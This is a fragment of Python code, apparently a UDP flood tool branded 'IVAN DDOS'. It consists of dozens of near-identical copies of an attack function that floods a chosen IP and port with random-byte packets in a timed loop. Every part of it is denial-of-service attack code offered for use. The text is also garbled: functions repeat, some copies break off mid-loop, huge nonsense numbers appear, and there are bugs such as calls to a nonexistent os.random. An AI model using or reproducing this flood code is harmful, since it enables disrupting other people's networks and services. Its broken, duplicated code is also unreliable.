    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

